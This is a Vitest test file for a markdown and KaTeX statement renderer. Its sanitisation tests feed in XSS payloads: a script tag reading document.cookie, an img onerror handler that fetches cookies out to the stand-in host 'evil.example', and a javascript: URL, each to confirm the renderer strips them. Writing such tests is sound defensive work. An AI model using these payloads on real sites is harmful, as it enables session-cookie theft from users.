import { beforeEach, describe, expect, it } from "vitest";
import { _clearStatementCacheForTests, renderStatement } from "./statement";

describe("renderStatement", () => {
  beforeEach(() => {
    _clearStatementCacheForTests();
  });

  it("renders plain markdown to HTML", async () => {
    const html = await renderStatement("Given an array **a**, find the sum.");
    expect(html).toContain("<strong>a</strong>");
  });

  it("renders inline and block KaTeX math", async () => {
    const html = await renderStatement("Compute $n^2$ for each $$\\sum_{i=1}^n i$$");
    expect(html).toContain("katex");
  });

  it("strips <script> tags entirely, leaving only inert text", async () => {
    const html = await renderStatement('Hello<script>alert(document.cookie)</script>world');
    expect(html).not.toContain("<script");
    expect(html).not.toContain("</script>");
  });

  it("strips onerror/onclick event-handler attributes from HTML", async () => {
    const html = await renderStatement('<img src="x.png" onerror="fetch(`//evil.example/${document.cookie}`)" alt="x">');
    expect(html).not.toContain("onerror");
    expect(html).not.toContain("evil.example");
  });

  it("strips javascript: URLs", async () => {
    const html = await renderStatement('[click me](javascript:alert(1))');
    expect(html).not.toContain("javascript:");
  });

  it("caches by cacheKey and returns the identical string on a second call", async () => {
    const first = await renderStatement("Version content $x$", "v-1");
    const second = await renderStatement("Different content entirely", "v-1");
    expect(second).toBe(first);
  });

  it("does not cache when no cacheKey is given", async () => {
    const first = await renderStatement("A");
    const second = await renderStatement("B");
    expect(second).not.toBe(first);
  });
});
